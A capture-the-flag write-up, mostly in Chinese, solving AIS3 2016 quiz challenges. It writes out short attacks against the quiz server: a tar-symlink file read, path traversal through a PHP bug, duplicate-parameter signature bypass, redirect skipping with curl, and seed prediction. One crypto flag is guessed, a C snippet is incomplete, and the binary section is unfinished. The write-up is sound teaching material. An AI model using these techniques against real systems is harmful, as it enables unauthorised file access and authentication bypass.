## misc-1
`ais3{2016_^_^_hello_world!}`
## misc-2
`hd UNPACK_ME` 觀察發現類似7z的[signature](http://www.7-zip.org/recover.html):  
37 7A BC AF 27 1C 被改成 37 5A BC AF 27 1C  
*(其實他就是把 "7z" 換成 "7Z" XD)*  
Use python mmap to repair:
``` python
with open('','a+') as file:
  mm = mmap.mmap(file.fileno(),0)
  mm[1] = '\x7A'
  mm.close()
```
修好之後會發現檔案被加密了  其中一個0 byte的檔名就是密碼   
`7z x 壓縮檔 -p密碼`  
接下來一樣的方式修好7z 解壓縮後會有secret.txt  
裡面是下一個檔案的密碼  
解壓縮一次size會減少300 bytes左右, 估計包了1000層
``` sh
for i in `seq 1000`;do
  filename=`ls | grep ".\{16,\}"`
  ./repair.py $filename
  7z x $filename -p`cat secret.txt` -y
done
```
```sh
cat flag.txt
ais3{7zzZzzzZzzZzZzzZiP}
```
## misc-3
提示是Symbolic Link

程式碼會把上傳的tar檔解壓縮後,  
再跟../flag.txt做hash比較  
要brute force去做hash collision看起來是不太可行..  
後來提示出來之後才知道symbolic link可以隨意指定路徑
```sh
ln -s ../flag.txt guess.txt
tar cvf guess.tar guess.txt
```
把檔案上傳後就可以拿到flag
## web-1
Google 也找不到的原因就是因為robots.txt的設定  
直接打開robots.txt 就能找到隱藏的網頁了  
https://quiz.ais3.org:8011/robots.txt
```
User-agent: *
Disallow: /admin
Disallow: /cgi-bin/
Disallow: /images/
Disallow: /tmp/
Disallow: /private/
Disallow: /this_secret_page_you_should_not_know_where_it_is.php
```
https://quiz.ais3.org:8011/this_secret_page_you_should_not_know_where_it_is.php   
`ais3{Y0u_beat_the_G00g1e!!}`
## web-2
Location 會向瀏覽器傳送 redirect 指令  
但是原本的網頁還是會傳送到client端  
使用無視redirect的curl:  
`curl https://quiz.ais3.org:8012/panel.php`
```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Admin Panel</title>
</head>
<body>
Admin's secret is: ais3{admin's_pane1_is_on_fir3!!!!!}</body>
</html>
```
## web-3
根據這個[bug](https://bugs.php.net/bug.php?id=55511):  
https://quiz.ais3.org:8013/download.php?p=../flag.php&a=10:5  
```php
Ha! Ha! You can not see the content of this file, because it is PHP!!! :)
<?php
$flag = "ais3{haha!i_bypassed_the_fucking_waf!}";
?>
```
## crypto-1
`xortool crypto1`發現可能的長度為 13 or 39  
`xortool crypto1 -l 13 -c 00`不是flag  
`xortool crypto1 -l 39 -c 00`會看到AIS字樣, 看來十分接近了  

改用空格分析:  
`xortool crypto1 -l 39 -c 20`  
`ais3{XoR_enCrYPtiON_15_n0t_a_G00d_i!ea}`  
上傳之後發現答案是錯的OAO  
根據某位大大的說法只好自己腦補一下XD   
`ais3{XoR_enCrYPtiON_15_n0t_a_G00d_idea}`  
不知道是不是bug還是解法不對
## crypto-2
這題其實可以繞過hash pump的部份  
　quiz.ais3.org:8014/?expire=1467442319&auth=2aa272c43a0440b10abb0a1c4266842b941bc63c&expire=9999999999999  
expire跟auth本來就已經是一對了  但是url如果有重複的parameter會以後面的為主  
只要讓expire > time(0)就可以了...  
`ais3{HasH.eXtension.@tt@ck!}`

理論上應該要避免掉這種狀況才對XD  不知道為什麼會留著這個漏洞  

## remote-1
time attack
```c
#include
int main(){
  srand(time(NULL));
  return rand()^0x2016a153;
}
```
```sh
./a.out | nc quiz.ais3.org port
ais3{sEEd_is_cRiTiCaL_@_@}
```
## binary-1
原本是用回推encrypted的方式  但是算出來的答案是錯的  
後來用計算instruction的方式  
待補
